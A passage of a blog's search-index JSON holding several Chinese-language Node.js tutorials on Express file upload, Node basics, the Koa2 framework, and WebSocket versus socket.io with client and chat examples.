&#123;\t\tconsole.log(&#x27;processing&#x27;);\t\tres.send(&#x27;processing the login form!&#x27;);\t&#125;);\n\n二十、上传文件\n首先，在网页插入上传文件的表单\n\n&lt;form action=&quot;/pictures/upload&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;  Select an image to upload:  &lt;input type=&quot;file&quot; name=&quot;image&quot;&gt;  &lt;input type=&quot;submit&quot; value=&quot;Upload Image&quot;&gt;&lt;/form&gt;\n\n\n然后，服务器脚本建立指向&#x2F;upload目录的路由。这时可以安装multer模块，它提供了上传文件的许多功能\n\nvar express = require(&#x27;express&#x27;);var router = express.Router();var multer = require(&#x27;multer&#x27;);var uploading = multer(&#123;  dest: __dirname + &#x27;../public/uploads/&#x27;,  // 设定限制，每次最多上传1个文件，文件大小不超过1MB  limits: &#123;fileSize: 1000000, files:1&#125;,&#125;)router.post(&#x27;/upload&#x27;, uploading, function(req, res) &#123;&#125;)module.exports = router","categories":["后端","框架"],"tags":["nodejs"]},{"title":"node-入门","url":"/2019/05/05/nodejs/node-%E5%85%A5%E9%97%A8/","content":"前言\nnodejs是事件驱动、非阻塞I&#x2F;O模型\n\n\n阻塞：i&#x2F;o时进程休眠等待完成后进行下一步\n非阻塞：i&#x2F;o时函数立即返回，进程不等待i&#x2F;o返回\n\n\ni&#x2F;o完成后通知主程序，如何告诉呢？通过事件驱动\n\n事件驱动\n\ni&#x2F;o等异步操作结束后通知\n内部实现是观察者模式\n\nCPU密集和I&#x2F;O密集\n\nCPU密集：压缩、解压、加密、解密\nI/O密集：文件操作、网络操作、数据库\n\nweb常见场景(web是一个I&#x2F;O密集)\n\n静态资源读取\n数据库操作\n渲染页面\n\n高并发应用之道\n\n增加机器数\n增加每台机器CPU数-多核\n\n\n进程、线程\n\n进程：一个运行的程序（进程包括线程，如何水分子里面还有分子原子）\n线程：进程内一个独立的，可调度的执行单元\n多线程：启动一个进程，在一个进程内启动多个线程，这样多个线程可以执行多个任务\n\nNodejs的单线程\n\n单线程只是针对主进程，I&#x2F;O操作系统底层多线程调度\n单线程并不是单进程\n\nNodejs原理\n\nNode是单线程的，只开一个进程，一个进程也只开一个线程。一个CPU上只开一个进程，一个进程里面只有一个线程\n\nnodejs高性能的前提\n\n高并发\nI/O密集\n\n常用场景\n\nweb Server\n本地代码构建 (webpack/grunt/gulp)\n使用工具的开发\n\n二、nodejs与JavaScrip异同\nECMAScript\n语法\n内置对象、方法\n\n顶层对象\n\nJavaScript：window\nnodejs: global\n在ECMA部分node和JavaScript是一样的，比如数据类型的定义，语法结构、内置对象\n\n三、模块\n在node中文件和模块是一一对应的，也就是一个文件一个模块。**file是每个模块下必有的一个属性，输出文件的绝对路径。**dirname 是文件夹名称绝对路径\n每个模块都有自己的作用域\n我们通过var声明的变量并非全局，而是该模块作用域下的\n\n模块加载机制\n\nrequire加载模块\n1、首先按照加载模块的文件名称进行查找\n2、如果没有找到就会在文件模块文件名称后加载.js进行查找\n3、如果还没有找到，就在文件名称后加载.json后缀，进行查找\n4、如果还没找到，就会在文件名称后加上.node进行查找\n查找流程：文件名称-&gt;.js -&gt; .json-&gt;.node\n\nexports、module\n\n保存当前模块有关的一些信息\nmodule.exports 一般使用这个,把一个模块中的变量对外提供访问\n在模块作用域，还有一个内置的模块对象，exports其实就是module.exports,他们两个都是指向同一个对象\n\n四、node目录的配置\n配置文件 :\npackage.json\n\n\ndependencies : 当前项目所使用到的依赖模块\n安装方式: npm install 自动读取package.json自动安装\n\n\nrouter目录 用来存放路由文件\n\nviews目录 用来存放html模板文件\n\nmodule目录 自己写的一些模块\n\n\n五、第一个node服务器//   安装好node就有的一个模块//  用来创建http服务器的const http = require(`http`);http.createServer((request,response) =&gt; &#123;    //request 请求对象     浏览器 请求 服务器所有的内容保存在这个对象里    //response 响应对象     服务器响应浏览器 所有的方法    response.writeHead(200 , &#123; &#x27;Content-Type&#x27;:&#x27;text/html&#x27; &#125; );    //  .end() 结束响应 同时发送一个 Hello Word    response.end(&#x27;Hello Word&#x27;)&#125;).listen(233);//.listen(); 监听端口 233  自定义的端口号// 如果开启了node服务器  修改完之后的代码必须 重启才能生效\n\n","categories":["后端"],"tags":["nodejs"]},{"title":"node-koa2总结","url":"/2019/06/27/nodejs/nodejs-koa2/","content":"一、Koa框架介绍以及Koa环境搭建1.1 Koa 框架介绍\nNode.js 是一个异步的世界，官方 API 支持的都是 callback 形式的异步编程模型，这 会带来许多问题，例如:\n\n\ncallback 嵌套问题\n异步函数中可能同步调用 callback 返回 数据，带来不一致性。为了解决以上问题 Koa 出现了\n\nKoa – 基于 Node.js 平台的下一代 web 开发框架\n\nkoa 是由 Express 原班人马打造的，致力于成为一个更小、更富有表现力、更健壮的 Web 框架。 使用 koa 编写 web 应用，可以免除重复繁琐的回调函数嵌套， 并极大地提 升错误处理的效率。koa不在内核方法中绑定任何中间件， 它仅仅提供了一个轻量优雅的 函数库，使得编写 Web 应用变得得心应手。开发思路和 express 差不多，最大的特点就是 可以避免异步嵌套\n\n1.2 Koa2.x 框架的安装使用1. 安装 Node.js 8.x 以上的版本\n\n开发 Koa2 之前，Node.js 是有要求的，它要求 Node.js 版本高于 V7.6。因为 node.js 7.6版本 开始完全支持 async/await，所以才能完全你支持我们的 Koa2&#96;\n\n2. 安装 Koa\n\n安装 Koa 框架和我们以前安装其他模块是一样的\n\nnpm install --save koa / cnpm install --save koa\n\n\n--save 参数，表示自动修改 package.json 文件，自动添加依赖项\n\n简单使用\n\n二、koa 路由 get传值、动态路由2.1 Koa 路由\n路由(Routing)是由一个 URI(或者叫路径)和一个特定的 HTTP 方法(GET、POST等)组成的，涉及到应用如何响应客户端对某个网站节点的访问\n通俗的讲:路由就是根据不同的 URL 地址，加载不同的页面实现不同的功能\nKoa 中的路由和 Express 有所不同，在 Express 中直接引入 Express 就可以配置路由，但是在 Koa中我们需要安装对应的 koa-router 路由模块来实现\n\nnpm install --save koa-router\n\n\n2.2 Koa 路由 get 传值\n在 koa2 中 GET 传值通过 request 接收，但是接收的方法有两种:query 和 querystring\n\n\nquery:返回的是格式化好的参数对象。\nquerystring:返回的是请求字符串\n\n\n2.3 Koa 动态路由\n三、koa 中间件及执行流程3.1 koa中间件的洋葱图执行流程\n3.2 koa 中间件3.2.1 什么是 Koa 的中间件\n通俗的讲:中间件就是匹配路由之前或者匹配路由完成做的一系列的操作，我们就可以把它叫做中间件\n在express中间件(Middleware)是一个函数，它可以访问请求对象(request object (req)), 响应对象(response object (res)), 和 web 应用中处理请求-响应循环流程中的中间件，一 般被命名为 next 的变量。在 Koa 中中间件和 express 有点类似。\n\n中间件的功能包括\n\n执行任何代码\n修改请求和响应对象\n终结请求-响应循环\n调用堆栈中的下一个中间件\n\n\n如果我的 get、post 回调函数中，没有 next 参数，那么就匹配上第一个路由，就不会往下匹 配了。如果想往下匹配的话，那么需要写 next()\n\n3.2.2 Koa 应用可使用如下几种中间件1. 应用级中间件\n\n2. 路由中间件\n\n3. 错误处理中间件\n\n4. 第三方中间件\n\n3.2.3 Koa 中间件的执行顺序\nKoa 的中间件和 Express 不同，Koa 选择了洋葱圈模型\n\n\n四、koa ejs模板引擎使用 以及ejs配置全局数据1. 安装 koa-views 和 ejs\n\n安装 koa-views npm install --save koa-views / cnpm install --save koa-views\n安装 ejs npm install ejs --save / cnpm install ejs --save\n\n2. 引入 koa-views 配置中间件\nconst views = require(&#x27;koa-views&#x27;);app.use(views(&#x27;views&#x27;, &#123; map: &#123;html: &#x27;ejs&#x27; &#125;&#125;));\n\n3. Koa 中使用 ejs\nrouter.get(&#x27;/add&#x27;,async (ctx)=&gt;&#123;     let title = &#x27;hello koa2&#x27;         await ctx.render(index&#x27;,&#123; title &#125;)&#125;)\n\n4. Ejs 引入模板\n&lt;%- include header.ejs %&gt;\n\n5. Ejs 绑定数据\n&lt;%=h%&gt;\n\n6. Ejs 绑定 html 数据\n&lt;%-h%&gt;\n\n7. Ejs 模板判断语句\n&lt;% if(true)&#123; %&gt;    &lt;div&gt;true&lt;/div&gt;&lt;%&#125; else&#123; %&gt;    &lt;div&gt;false&lt;/div&gt;&lt;%&#125; %&gt;\n\n8. Ejs 模板中循环数据\n&lt;%for(var i=0;i&lt;list.length;i++) &#123; %&gt;    &lt;li&gt;&lt;%=list[i] %&gt;&lt;/li&gt;&lt;%&#125;%&gt;\n\n五、koa post 提交数据 koa-bodyparser 中间件的使用5.1 原生 Nodejs 获取 post 提交数据function parsePostData(ctx)&#123;    return new Promise((resolve,reject)=&gt;&#123;        try&#123;            let postdata=&quot;&quot;;            ctx.req.on(&#x27;data&#x27;,(data)=&gt;&#123;                postdata += data            &#125;)            ctx.req.on(&quot;end&quot;,function()&#123;                resolve(postdata);            &#125;)        &#125;catch(error)&#123;            reject(error);        &#125;      &#125;    &#125;);&#125;\n\n5.2 Koa 中 koa-bodyparser 中间件的使用1. 安装 koa-bodyparser\nnpm install --save koa-bodyparser\n\n2. 安装 引入配置中间件\nvar Koa = require(&#x27;koa&#x27;);var bodyParser = require(&#x27;koa-bodyparser&#x27;);var app = new Koa();app.use(bodyParser());app.use(async ctx =&gt; &#123;    ctx.body = ctx.request.body;&#125;)\n\n3. 使用\nctx.request.body // 获取 post 提交的数据\n\n六、koa-static静态资源中间件1. 安装 koa-static\nnpm install --save koa-static\n\n2. 引入配置中间件\nconst static = require(&#x27;koa-static&#x27;);app.use(static(    path.join( __dirname, &#x27;public&#x27;)))\n\n七、koa art-template高性能模板引擎的使用7.1 常见模板引擎的性能对比\n适用于 koa 的模板引擎选择非常多，比如 jade、ejs、nunjucks、art-template 等\n\n\nart-template 是一个简约、超快的模板引擎\n它采用作用域预声明的技术来优化模板渲染速度，从而获得接近 JavaScript 极限的运行 性能，并且同时支持 NodeJS 和浏览器。\nart-template 支持 ejs 的语法，也可以用自己的类似 angular 数据绑定的语法\n中文文档: http://aui.github.io/art-template/zh-cn/docs\n\n\n\n7.2 在 Koa 中使用 art-template 模板引擎npm install --save art-template npm install --save koa-art-templateconst Koa = require(&#x27;koa&#x27;);const render = require(&#x27;koa-art-template&#x27;);const app = new Koa();render(app, &#123;    root: path.join(__dirname, &#x27;view&#x27;),    extname: &#x27;.art&#x27;,    debug: process.env.NODE_ENV !== &#x27;production&#x27;&#125;);app.use(async function (ctx) &#123;    await ctx.render(&#x27;user&#x27;);&#125;);app.listen(8080);\n\n7.3 art-template 模板引擎语法\n参考:http://aui.github.io/art-template/zh-cn/docs/syntax.html\n\n八、koa Cookie的使用8.1 Koa Cookie 的使用1. Koa 中设置 Cookie 的值\nctx.cookies.set(name, value, [options])\n\n\n通过 options 设置 cookie name 的 value\n\n\n2. Koa 中获取 Cookie 的值\nctx.cookies.get(&#x27;name&#x27;);\n\n8.2 Koa 中设置中文 Cookieconsole.log(new Buffer(&#x27;hello, world!&#x27;).toString(&#x27;base64&#x27;));// 转换成 base64 字符 串:aGVsbG8sIHdvcmxkIQ==console.log(new Buffer(&#x27;aGVsbG8sIHdvcmxkIQ==&#x27;, &#x27;base64&#x27;).toString());// 还原 base 64 字符串:hello, world!\n\n九、koa Session 的使用9.1 Session 简单介绍\nsession 是另一种记录客户状态的机制，不同的是 Cookie 保存在客户端浏览器中，而 session 保存在服务器上\n\n9.2 Session 的工作流程\n当浏览器访问服务器并发送第一次请求时，服务器端会创建一个 session 对象，生 成一个类似于 key,value 的键值对， 然后将key(cookie)返回到浏览器(客户)端，浏览 器下次再访问时，携带 key(cookie)，找到对应的 session(value)。 客户的信息都保存 在 session 中\n\n9.3 koa-session 的使用1. 安装 express-session\nnpm install koa-session --save\n\n2. 引入 express-session\nconst session = require(&#x27;koa-session&#x27;);\n\n3. 设置官方文档提供的中间件\napp.keys = [&#x27;some secret hurr&#x27;];const CONFIG = &#123;    key: &#x27;koa:sess&#x27;, //cookie key (default is koa:sess)    maxAge: 86400000, // cookie 的过期时间 maxAge in ms (default is 1 days)    overwrite: true, //是否可以 overwrite (默认 default true)    httpOnly: true, //cookie 是否只有服务器端可以访问 httpOnly or not (default true)    signed: true, //签名默认 true    rolling:false, //在每次请求时强行设置cookie，这将重置cookie过期时间(默认:false)    renew: false, //(boolean) renew session when session is nearly expired&#125;app.use(session(CONFIG, app));\n\n4. 使用\n//设置值 ctx.session.username = &quot;张三&quot;;// 获取值 ctx.session.username\n\n9.4 Cookie 和 Session 区别\ncookie 数据存放在客户的浏览器上，session 数据放在服务器上\ncookie 不是很安全，别人可以分析存放在本地的 COOKIE 并进行 COOKIE 欺骗 考虑到安全应当使用 session\nsession会在一定时间内保存在服务器上。当访问增多，会比较占用你服务器的性能 考虑到减轻服务器性能方面，应当使用 COOKIE\n单个 cookie 保存的数据不能超过 4K，很多浏览器都限制一个站点最多保存 20 个 cookie\n\n十、Koa 操作 Mongodb 数据库\n官方文档:http://mongodb.github.io/node-mongodb-native/\n\n十一、Koa 应用生成器以及 Koa 路由模 块化11.1 koa 应用生成器\n通过应用 koa 脚手架生成工具 可以快速创建一个基于 koa2 的应用的骨架\n\n1. 全局安装\nnpm install koa-generator -g\n\n2. 创建项目\nkoa koa_demo\n\n3. 安装依赖\ncd koa_demonpm install\n\n4. 启动项目\nnpm start\n\n11.2 koa 搭建模块化路由&#x2F;层级路由\n在目录下面新建一个文件夹 routes\n在 routes 里面配置对应的子页面\n比如在 routes 新建 index.js\n\n\n\n然后在主应用中加载子路由模块:\n\n\n","categories":["后端","框架"],"tags":["nodejs"]},{"title":"nodejs-websocker与socket.io的区别","url":"/2019/05/26/nodejs/nodejs-websocker%E4%B8%8Esocket.io%E7%9A%84%E5%8C%BA%E5%88%AB/","content":"第一部分 WebSocket一、WebSocket 解决了什么问题\n客户端(浏览器)和服务器端进行通信，只能由客户端发起ajax请求，才能进行通信，服务器端无法主动向客户端推送信息\n当出现类似体育赛事、聊天室、实时位置之类的场景时，客户端要获取服务器端的变化，就只能通过轮询(定时请求)来了解服务器端有没有新的信息变化\n\n轮询效率低，非常浪费资源(需要不断发送请求，不停链接服务器)\n\nWebSocket的出现，让服务器端可以主动向服务器端发送信息，使得浏览器具备了实时双向通信的能力,这就是WebSocket解决的问题\n\n一个超简单例子\n\n新建一个html文件，将本栗子找个地方跑一下试试，即可轻松入门WebSocket\n\nfunction socketConnect(url) &#123;    // 客户端与服务器进行连接    let ws = new WebSocket(url); // 返回`WebSocket`对象，赋值给变量ws    // 连接成功回调    ws.onopen = e =&gt; &#123;        console.log(&#x27;连接成功&#x27;, e)        ws.send(&#x27;我发送消息给服务端&#x27;); // 客户端与服务器端通信    &#125;    // 监听服务器端返回的信息    ws.onmessage = e =&gt; &#123;        console.log(&#x27;服务器端返回：&#x27;, e.data)        // do something    &#125;    return ws; // 返回websocket对象&#125;let wsValue = socketConnect(&#x27;ws://121.40.165.18:8800&#x27;); // websocket对象\n\n\n上述栗子中WebSocket的接口地址出自：WebSocket 在线测试，在开发的时候也可以用于测试后端给的地址是否可用\n\n\n二、webSocket的class类\n当项目中很多地方使用WebSocket，把它封成一个class类，是更好的选择\n\nclass WebSocketClass &#123;    /**     * @description: 初始化实例属性，保存参数     * @param &#123;String&#125; url ws的接口     * @param &#123;Function&#125; msgCallback 服务器信息的回调传数据给函数     * @param &#123;String&#125; name 可选值 用于区分ws，用于debugger     */    constructor(url, msgCallback, name = &#x27;default&#x27;) &#123;        this.url = url;        this.msgCallback = msgCallback;        this.name = name;        this.ws = null;  // websocket对象        this.status = null; // websocket是否关闭    &#125;    /**     * @description: 初始化 连接websocket或重连webSocket时调用     * @param &#123;*&#125; 可选值 要传的数据     */    connect(data) &#123;        // 新建 WebSocket 实例        this.ws = new WebSocket(this.url);        this.ws.onopen = e =&gt; &#123;            // 连接ws成功回调            this.status = &#x27;open&#x27;;            console.log(`$&#123;this.name&#125;连接成功`, e)            // this.heartCheck();            if (data !== undefined) &#123;                // 有要传的数据,就发给后端                return this.ws.send(data);            &#125;        &#125;        // 监听服务器端返回的信息        this.ws.onmessage = e =&gt; &#123;            // 把数据传给回调函数，并执行回调            // if (e.data === &#x27;pong&#x27;) &#123;            //     this.pingPong = &#x27;pong&#x27;; // 服务器端返回pong,修改pingPong的状态            // &#125;            return this.msgCallback(e.data);        &#125;        // ws关闭回调        this.ws.onclose = e =&gt; &#123;            this.closeHandle(e); // 判断是否关闭        &#125;        // ws出错回调        this.onerror = e =&gt; &#123;            this.closeHandle(e); // 判断是否关闭        &#125;    &#125;    // heartCheck() &#123;    //     // 心跳机制的时间可以自己与后端约定    //     this.pingPong = &#x27;ping&#x27;; // ws的心跳机制状态值    //     this.pingInterval = setInterval(() =&gt; &#123;    //         if (this.ws.readyState === 1) &#123;    //             // 检查ws为链接状态 才可发送    //             this.ws.send(&#x27;ping&#x27;); // 客户端发送ping    //         &#125;    //     &#125;, 10000)    //     this.pongInterval = setInterval(() =&gt; &#123;    //         this.pingPong = false;    //         if (this.pingPong === &#x27;ping&#x27;) &#123;    //             this.closeHandle(&#x27;pingPong没有改变为pong&#x27;); // 没有返回pong 重启webSocket    //         &#125;    //         // 重置为ping 若下一次 ping 发送失败 或者pong返回失败(pingPong不会改成pong)，将重启    //         console.log(&#x27;返回pong&#x27;)    //         this.pingPong = &#x27;ping&#x27;    //     &#125;, 20000)    // &#125;    // 发送信息给服务器    sendHandle(data) &#123;        console.log(`$&#123;this.name&#125;发送消息给服务器:`, data)        return this.ws.send(data);    &#125;    closeHandle(e = &#x27;err&#x27;) &#123;        // 因为webSocket并不稳定，规定只能手动关闭(调closeMyself方法)，否则就重连        if (this.status !== &#x27;close&#x27;) &#123;            console.log(`$&#123;this.name&#125;断开，重连websocket`, e)            // if (this.pingInterval !== undefined &amp;&amp; this.pongInterval !== undefined) &#123;            //     // 清除定时器            //     clearInterval(this.pingInterval);            //     clearInterval(this.pongInterval);            // &#125;            this.connect(); // 重连        &#125; else &#123;            console.log(`$&#123;this.name&#125;websocket手动关闭`)        &#125;    &#125;    // 手动关闭WebSocket    closeMyself() &#123;        console.log(`关闭$&#123;this.name&#125;`)        this.status = &#x27;close&#x27;;        return this.ws.close();    &#125;&#125;function someFn(data) &#123;    console.log(&#x27;接收服务器消息的回调：&#x27;, data);&#125;// const wsValue = new WebSocketClass(&#x27;ws://121.40.165.18:8800&#x27;, someFn, &#x27;wsName&#x27;); // 这个链接一天只能发送消息50次const wsValue = new WebSocketClass(&#x27;wss://echo.websocket.org&#x27;, someFn, &#x27;wsName&#x27;); // 阮一峰老师教程链接wsValue.connect(&#x27;立即与服务器通信&#x27;); // 连接服务器// setTimeout(() =&gt; &#123;//     wsValue.sendHandle(&#x27;传消息给服务器&#x27;)// &#125;, 1000);// setTimeout(() =&gt; &#123;//     wsValue.closeMyself(); // 关闭ws// &#125;, 10000)\n\n\n可以把class放在一个js文件里面,export出去，然后在需要用的地方再import进来，把参数传进去就可以用了\n\n三、WebSocket不稳定\nWebSocket并不稳定，在使用一段时间后，可能会断开连接，貌似至今没有一个为何会断开连接的公论，所以我们需要让WebSocket保持连接状态，这里推荐两种方法\n\n3.1 WebSocket设置变量，判断是否手动关闭连接\nclass类中就是用的这种方式:设置一个变量，在webSocket关闭&#x2F;报错的回调中，判断是不是手动关闭的，如果不是的话，就重新连接，这样做的优缺点如下\n\n\n优点：请求较少(相对于心跳连接)，易设置。\n缺点：可能会导致丢失数据,在断开重连的这段时间中，恰好双方正在通信\n\n3.2 WebSocket心跳机制\n因为第一种方案的缺点，并且可能会有其他一些未知情况导致断开连接而没有触发Error或Close事件。这样就导致实际连接已经断开了，而客户端和服务端却不知道，还在傻傻的等着消息来\n\n\n想出了一种叫做心跳机制的解决方法：\n客户端就像心跳一样每隔固定的时间发送一次ping，来告诉服务器，我还活着，而服务器也会返回pong，来告诉客户端，服务器还活着。\n具体的实现方法，在上面class的注释中，将其打开，即可看到效果\n\n四、关于WebSocket4.1 WebSocket的当前状态:WebSocket.readyState下面是WebSocket.readyState的四个值(四种状态)：\n\n0: 表示正在连接\n1: 表示连接成功，可以通信了\n2: 表示连接正在关闭\n3: 表示连接已经关闭，或者打开连接失败\n\n\n我们可以利用当前状态来做一些事情，比如上面栗子中当WebSocket链接成功后，才允许客户端发送ping\n\nif (this.ws.readyState === 1) &#123;    // 检查ws为链接状态 才可发送    this.ws.send(&#x27;ping&#x27;); // 客户端发送ping&#125;\n\n4.2 WebSocket还可以发送&#x2F;接收 二进制数据\n二进制数据包括：blob对象和Arraybuffer对象，所以我们需要分开来处理\n\n // 接收数据ws.onmessage = function(event)&#123;    if(event.data instanceof ArrayBuffer)&#123;        // 判断 ArrayBuffer 对象    &#125;    if(event.data instanceof Blob)&#123;        // 判断 Blob 对象    &#125;&#125;// 发送 Blob 对象的例子let file = document.querySelector(&#x27;input[type=&quot;file&quot;]&#x27;).files[0];ws.send(file);// 发送 ArrayBuffer 对象的例子var img = canvas_context.getImageData(0, 0, 400, 320);var binary = new Uint8Array(img.data.length);for (var i = 0; i &lt; img.data.length; i++) &#123;    binary[i] = img.data[i];&#125;ws.send(binary.buffer);\n\n\n如果你要发送的二进制数据很大的话，如何判断发送完毕：\n\nwebSocket.bufferedAmount属性，表示还有多少字节的二进制数据没有发送出去：var data = new ArrayBuffer(10000000);socket.send(data);if (socket.bufferedAmount === 0) &#123;    // 发送完毕&#125; else &#123;    // 发送还没结束&#125;\n\n五、WebSocket的优点\n双向通信\n数据格式比较轻量，性能开销小，通信高效\n协议控制的数据包头部较小，而HTTP协议每次通信都需要携带完整的头部\n\n\n更好的二进制支持\n没有同源限制，客户端可以与任意服务器通信\n与 HTTP 协议有着良好的兼容性。默认端口也是80和443，并且握手阶段采用 HTTP 协议，因此握手时不容易屏蔽，能通过各种 HTTP 代理服务器\n\n第二部分 socket.io一、原生Node与socket.io通信\n原生nodejs结合Socket.io实现服务器和客户端的相互通信\n\n\n官方文档 https://socket.io\n\n1.1 搭建服务# 新建目录mkdir socket &amp;&amp; cd socket# 生成package.jsonnpm init -y# 安装socketnpm install socket.io// app.jsvar http = require(&quot;http&quot;);var server = http.createServer(function(req,res)&#123;    if(req.url == &quot;/&quot;)&#123; //显示首页        fs.readFile(&quot;./index.html&quot;,function(err,data)&#123;             res.end(data);        &#125;);     &#125;&#125;);var io = require(&#x27;socket.io&#x27;)(server);//监听连接事件 io.on(&quot;connection&quot;,function(socket)&#123;    console.log(&quot;1 个客户端连接了&quot;); &#125;)server.listen(3000,&quot;127.0.0.1&quot;,function()&#123;    console.log(&#x27;app run at 127.0.0.1:3000&#x27;)&#125;);// 写完这句话之后，你就会发现，http://127.0.0.1:3000/socket.io/socket.io.js 就是一个 js 文件 的地址了\n\n1.2 新建页面\n现在需要制作一个index页面，这个页面中，必须引用秘密js文件。调用io函数，取得socket 对象\n\n&lt;!DOCTYPE html&gt; &lt;html lang=&quot;en&quot;&gt; &lt;head&gt;&lt;meta charset=&quot;UTF-8&quot;&gt;&lt;title&gt;Document&lt;/title&gt; &lt;/head&gt;&lt;body&gt;&lt;h1&gt;我是 index 页面，我引用了秘密 script 文件&lt;/h1&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;/socket.io/socket.io.js&quot;&gt;&lt;/script&gt; &lt;script type=&quot;text/javascript&quot;&gt;    var socket = io();     console.log(socket)&lt;/script&gt;&lt;/body&gt; &lt;/html&gt;\n\n\n至此，服务器和客户端都有 socket 对象了。服务器的 socket 对象:\n\n\nsocket对象\n\n\n1.3 服务器端通过emit广播，通过on接收广播// app.jsvar http = require(&quot;http&quot;);var server = http.createServer(function(req,res)&#123;    if(req.url == &quot;/&quot;)&#123; //显示首页        fs.readFile(&quot;./index.html&quot;,function(err,data)&#123;             res.end(data);        &#125;);     &#125;&#125;);var io = require(&#x27;socket.io&#x27;)(server);//监听连接事件 io.on(&#x27;connection&#x27;,function(socket) &#123;    console.log(&#x27;和服务器建立连接了&#x27;);        socket.on(&#x27;to-server&#x27;,function(data) &#123;            // 接收客户端传过来的数据        console.log(&#x27;客户端说:&#x27; + data);                // 向客户端发送数据        // socket 只给当前发送消息给服务端的客户端发送消息        socket.emit(&#x27;to-client&#x27;,&#x27;我是服务器返回的数据&#x27;);            &#125;)     socket.on(&#x27;disconnect&#x27;,function() &#123;        console.log(&#x27;断开连接了&#x27;);    &#125;)&#125;)server.listen(3000,&quot;127.0.0.1&quot;,function()&#123;    console.log(&#x27;app run at 127.0.0.1:3000&#x27;)&#125;);\n\n\n\n每一个连接上来的用户，都有一个 socket。由于我们的 emit 语句，是 socket.emit()发 出的，所以指的是向这个客户端发出语句。广播，就是给所有当前连接的用户发送信息:\n\nvar io = require(&#x27;socket.io&#x27;)(server);io.on(&#x27;connection&#x27;,function(socket) &#123;    console.log(&#x27;和服务器建立连接了&#x27;)        socket.on(&#x27;to-server&#x27;,function(data) &#123;            console.log(&#x27;客户端说:&#x27; + data);                // io 给所有建立连接的客户端发送数据，不管是哪个客户端发送消息，都会对所有客户端进行广播一次        io.emit(&#x27;to-client&#x27;,&#x27;我是服务器返回的数据&#x27;);    &#125;)     socket.on(&#x27;disconnect&#x27;,function() &#123;        console.log(&#x27;断开连接了&#x27;);    &#125;)&#125;)\n\n\n\nio.emit()可以实现聊天室消息群发\nsocket.emit()可以实现聊天机器人，一对一发送\n\n1.4 客户端端通过emit广播，通过on接收广播// index.html&lt;!DOCTYPE html&gt; &lt;html lang=&quot;en&quot;&gt; &lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;title&gt;socket demo&lt;/title&gt; &lt;/head&gt;&lt;body&gt;&lt;h1&gt;我是 index 页面，我引用了秘密 script 文件&lt;/h1&gt;&lt;button id=&quot;btn&quot;&gt;给服务端发送数据&lt;/button&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;/socket.io/socket.io.js&quot;&gt;&lt;/script&gt; &lt;script type=&quot;text/javascript&quot;&gt;    // 连接的地址http://localhost:3000 后台提供    var socket = io.connect(&#x27;http://localhost:3000&#x27;);    // 客户端建立连接    socket.on(&#x27;connect&#x27;,function() &#123;        console.log(&#x27;客户端和服务端建立连接了&#x27;);    &#125;)     socket.on(&#x27;disconnect&#x27;,function() &#123;        console.log(&#x27;客户端和服务端断开连接了&#x27;);    &#125;)     // 客户端给服务端发送数据后，监听服务端返回的数据    socket.on(&#x27;to-client&#x27;,function(data) &#123;        console.log(&#x27;客户端说:&#x27; + data);    &#125;)     var btn = document.getElementById(&#x27;btn&#x27;);    btn.onclick = function() &#123;        socket.emit(&#x27;to-server&#x27;,&#x27;我是客户端的数据&#x27;);    &#125;&lt;/script&gt;&lt;/body&gt; &lt;/html&gt;\n\n二、聊天室、智能机器人实现原理2.1 express简单例子\nExpress 结合 Socket.io 实现服务器和客户 端的相互通信、聊天室、智能机器人实现 原理\n\n\n\nexpress文档\nsocket.io文档\n\n\n1. Server (app.js)\nvar app = require(&#x27;express&#x27;)();var server = require(&#x27;http&#x27;).Server(app);var io = require(&#x27;socket.io&#x27;)(server);server.listen(80);// WARNING: app.listen(80) will NOT work here!app.get(&#x27;/&#x27;, function (req, res) &#123;  res.sendFile(__dirname + &#x27;/index.html&#x27;);&#125;);io.on(&#x27;connection&#x27;, function (socket) &#123;  socket.emit(&#x27;news&#x27;, &#123; hello: &#x27;world&#x27; &#125;);  socket.on(&#x27;my other event&#x27;, function (data) &#123;    console.log(data);  &#125;);&#125;);\n\n2. Client (index.html)\n&lt;script src=&quot;/socket.io/socket.io.js&quot;&gt;&lt;/script&gt;&lt;script&gt;  var socket = io.connect(&#x27;http://localhost&#x27;);  socket.on(&#x27;news&#x27;, function (data) &#123;    console.log(data);    socket.emit(&#x27;my other event&#x27;, &#123; my: &#x27;data&#x27; &#125;);  &#125;);&lt;/script&gt;\n\n2.2 express实现智能机器人&lt;!--views/index.ejx--&gt;&lt;html&gt;&lt;head&gt;  &lt;title&gt;&lt;/title&gt;    &lt;script src=&quot;/jquery-1.11.3.min.js&quot;&gt;&lt;/script&gt;    &lt;script src=&quot;/socket.io/socket.io.js&quot;&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;    &lt;input type=&quot;text&quot; id=&quot;msg&quot;/&gt;    &lt;br/&gt;    &lt;br/&gt;    &lt;button id=&quot;send&quot;&gt;发送&lt;/button&gt;&lt;/body&gt;&lt;/html&gt;&lt;script&gt;$(function()&#123;    var socket = io.connect(&#x27;http://127.0.0.1:8000&#x27;);    //群聊功能--聊天室    $(&#x27;#send&#x27;).click(function()&#123;        var msg=$(&#x27;#msg&#x27;).val();        socket.emit(&#x27;message&#x27;,msg);  /*客户端给服务器发送数据*/    &#125;)    //接受服务器返回的数据    socket.on(&#x27;servermessage&#x27;,function(data)&#123;        console.log(data)    &#125;)&#125;)&lt;/script&gt;// app.jsvar express=require(&#x27;express&#x27;);var app=express();/*第一步*/var server = require(&#x27;http&#x27;).Server(app);var io = require(&#x27;socket.io&#x27;)(server);app.set(&#x27;view engine&#x27;,&#x27;ejs&#x27;);app.use(express.static(&#x27;public&#x27;));app.get(&#x27;/&#x27;,function(req,res)&#123;    //res.send(&#x27;首页&#x27;);    res.render(&#x27;index&#x27;);&#125;)app.get(&#x27;/news&#x27;,function(req,res)&#123;    res.send(&#x27;news&#x27;);&#125;)//2.监听端口server.listen(8000,&#x27;127.0.0.1&#x27;);   /*改ip*///3、写socket的代码io.on(&#x27;connection&#x27;, function (socket) &#123;  console.log(&#x27;建立链接&#x27;)    socket.on(&#x27;message&#x27;,function(data)&#123;        console.log(data);        //io.emit  广播 --- 聊天室        //socket.emit  谁给我发的信息我回返回给谁 --- 智能机器人        //io.emit(&#x27;servermessage&#x27;,data);   /*服务器给客户端发送数据*/        if(data==1)&#123;            var msg=&#x27;您当前的话费有2元&#x27;        &#125;else if(data==2)&#123;            var 